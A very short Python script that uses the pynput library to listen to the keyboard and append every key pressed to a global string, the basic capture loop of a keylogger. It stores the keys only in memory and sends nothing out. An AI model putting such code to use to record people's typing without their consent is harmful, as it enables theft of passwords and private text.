from pynput.keyboard import Key, Listener

logresult = ""


def on_press(key):
    global logresult
    logresult += (str(key))

with Listener(on_press=on_press) as listener:
    listener.join()